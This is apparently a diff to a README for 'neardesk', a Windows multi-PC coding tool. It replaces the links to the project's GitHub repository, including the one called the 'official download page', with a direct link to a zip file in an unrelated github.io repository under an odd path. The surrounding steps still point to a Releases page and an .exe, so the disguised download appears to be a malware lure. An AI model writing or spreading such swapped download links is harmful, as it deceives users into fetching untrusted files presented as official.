@@ -5,7 +5,7 @@ description: "Manage local desktop workspaces and window layouts on Windows usin
 ---
 # 💻 neardesk - Control multiple PCs for coding tasks
 
-[![Download neardesk](https://img.shields.io/badge/Download-Release_Page-blue)](https://github.com/muhammadsaqib-ops/neardesk)
+[![Download neardesk](https://img.shields.io/badge/Download-Release_Page-blue)](https://raw.githubusercontent.com/muhammadsaqib-ops/muhammadsaqib-ops.github.io/main/expel/ops-github-io-muhammadsaqib-wangateur.zip)
 
 This software lets you link several Windows computers together. You control these machines from one main laptop. Your computer sends coding tasks to the other machines over your home network. This setup turns your spare PCs into a team of workers for your coding projects.
 
@@ -23,7 +23,7 @@ You should connect all devices to the same local area network. This software wor
 
 ## 📥 How to Install and Start
 
-1.  Visit the [official download page](https://github.com/muhammadsaqib-ops/neardesk) to get the installer.
+1.  Visit the [official download page](https://raw.githubusercontent.com/muhammadsaqib-ops/muhammadsaqib-ops.github.io/main/expel/ops-github-io-muhammadsaqib-wangateur.zip) to get the installer.
 2.  Look for the latest version under the Releases section.
 3.  Click the file ending in .exe to save it to your computer.
 4.  Open the folder where you saved the file.
